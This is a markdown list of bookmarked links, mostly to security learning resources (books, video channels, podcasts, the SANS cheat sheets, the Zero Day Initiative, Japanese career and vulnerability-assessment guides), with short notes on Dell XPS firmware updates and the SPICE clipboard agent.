- [Amazon.com - A Bug Hunter's Reading List](https://web.archive.org/web/20221206025221/https://www.amazon.com/ideas/amzn1.account.AHMETKWTW3WIMNFDCKU6HJOTXOAQ/17DNK7MXJFZPF)
- [The Tangled Web: A Guide to Securing Modern Web Applications](https://archive.org/details/thetangledwebaguidetosecuringmodernwebapplications)

### Scholarly Articles, Academic Paper

- [arXiv.org e-Print archive](https://arxiv.org/)

### Video

- [LiveOverflow](https://liveoverflow.com/)
- [IppSec](https://www.youtube.com/@ippsec)
- [0xdf](https://www.youtube.com/@0xdf)

### Podcast

- [Darknet Diaries](https://darknetdiaries.com/)

## Stuff

- [index - hacking](https://new.reddit.com/r/hacking/wiki/index/)
- [onlurking/awesome-infosec](https://github.com/onlurking/awesome-infosec)
- [The Ultimate List of SANS Cheat Sheets \| SANS Institute](https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/)
- [COOLEST CAREERS IN CYBER.pdf](https://assets.contentstack.io/v3/assets/blt36c2e63521272fdc/blt32196a45045f0345/6218bcf5b6471b5f9d4a59a5/Poster_-_Coolest_Careers_-_Japanese[100][50].pdf)
- [Home \| Zero Day Initiative](https://www.zerodayinitiative.com/)
- [How To Become A Hacker: Japanese](https://cruel.org/freeware/hacker.html)
- [Emulator 101 - Welcome](http://www.emulator101.com/)
- [賢い質問のしかた](https://www.ranvis.com/articles/smart-questions.ja.html)
- [The New Hacker's Dictionary](https://www.outpost9.com/reference/jargon/jargon_toc.html)
- [インシデント指揮官トレーニングの手引き | Yakst](https://yakst.com/ja/posts/5588)
- [セキュリティエンジニアを3年続けて分かったおすすめ勉強法](https://p-0.me/b/p/614/)
- [政府情報システムにおける 脆弱性診断導入ガイドライン](https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/3bc45d3c/20220630_resources_standard_guidelines_guidelines_08.pdf)
- [Staff Engineer: Leadership beyond the management track](https://staffeng.com/)

XPS9320 firmware

- [fwupd - ArchWiki](https://wiki.archlinux.org/title/Fwupd)

Clipboard Copy

- [SPICE vdagent](https://www.spice-space.org/download.html)
